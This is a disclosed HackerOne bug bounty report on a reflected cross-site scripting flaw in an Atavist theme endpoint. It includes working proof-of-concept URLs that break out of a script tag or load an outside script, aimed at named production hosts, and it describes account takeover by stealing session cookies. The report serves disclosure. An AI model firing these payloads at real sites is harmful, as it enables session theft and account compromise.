# Reflected XSS on a Atavist theme at external_import.php

## Metadata
- **Source:** HackerOne
- **Report:** 976657 | https://hackerone.com/reports/976657
- **Submitted:** 2020-09-08
- **Reporter:** bugra
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** high
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary:
Hi team,
I found this php file https://magazine.atavist.com/static/external_import.php , and there is a parameter called `scripts` on this php file. 
Basically, the endpoint prints value of `scripts` parameter to `<script src='$Value'>`.
So we can import any script file like that : https://magazine.atavist.com/static/external_import.php?scripts=//15.rs
Or we can write HTML tags too, th

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary:
Hi team,
I found this php file https://magazine.atavist.com/static/external_import.php , and there is a parameter called `scripts` on this php file. 
Basically, the endpoint prints value of `scripts` parameter to `<script src='$Value'>`.
So we can import any script file like that : https://magazine.atavist.com/static/external_import.php?scripts=//15.rs
Or we can write HTML tags too, there is no encoding : https://magazine.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E

This endpoint is also available on other websites. Like :
https://docs.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
http://www.377union.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E

Also there is no secure flag on the session cookie (`periodicSessionatavist`). So this XSS leads to account takeover.

## Impact

Reflected XSS - account takeover via cookie stealing

Thanks,
Bugra

</details>

---
*Analysed by Claude on 2026-05-24*
